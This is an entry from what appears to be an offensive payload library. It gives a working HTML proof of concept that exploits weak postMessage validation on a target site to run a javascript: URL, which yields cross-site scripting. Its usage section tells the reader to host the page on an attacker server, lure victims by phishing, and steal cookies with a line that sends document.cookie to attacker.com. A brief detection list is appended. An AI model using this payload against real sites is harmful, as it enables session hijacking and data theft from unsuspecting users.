---
id: 3f906dfd-2103-425c-adb0-94b55d5bc31c
type: code
name: PostMessage-XSS-Button-Click-HTML
language: HTML
verified: true
created_at: '2023-04-06T03:56:42.174142+00:00'
updated_at: '2023-04-10T20:21:54.099706+00:00'
tags:
  - xss
  - postmessage
  - payload
platforms:
  - Web
  - Browser
validated: true
---

# PostMessage-XSS-Button-Click-HTML

## Code

```html
<html>
<body>
    <input type=button value="Click Me" id="btn">
</body>

<script>
document.getElementById('btn').onclick = function(e){
    window.poc = window.open('$_TARGET_URL');
    setTimeout(function(){
        window.poc.postMessage(
            {
                "sender": "accounts",
                "url": "javascript:$_PAYLOAD",
            },
            '*'
        );
    }, 2000);
}
</script>
</html>
```

## Description

This HTML code creates a simple webpage with a button that, when clicked, opens a new browser window to the target URL and sends a postMessage with a malicious javascript: URL payload. The message mimics a legitimate sender (e.g., "accounts") to bypass weak validation on the target site. The 2-second delay allows the target window to load. If the target processes the 'url' field unsafely, the JavaScript executes in the victim's context, enabling XSS for data theft or further exploitation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_TARGET_URL | The URL of the vulnerable target site, including any hash or path | http://vulnerable.com/#login |
| $_PAYLOAD | The JavaScript code to execute, wrapped in javascript: protocol | confirm(document.cookie) |

## Usage

Host this HTML file on an attacker-controlled web server and lure a victim to visit it via phishing or a malicious link. Customize the payload to steal cookies (e.g., new Image().src='http://attacker.com/?c='+document.cookie) or perform other actions like keylogging. This is used in social engineering scenarios targeting users of vulnerable web applications that rely on postMessage for cross-origin communication.

## Detection

- Browser console errors or logs showing unexpected postMessage events from untrusted origins.
- CSP violations if javascript: URLs are blocked.
- Network monitoring for anomalous cross-origin messages or exfiltration requests.
- User reports of suspicious pop-ups or redirects after clicking buttons on untrusted sites.

## Related

- [[procedures/XSS-via-PostMessage-Button-Click]]
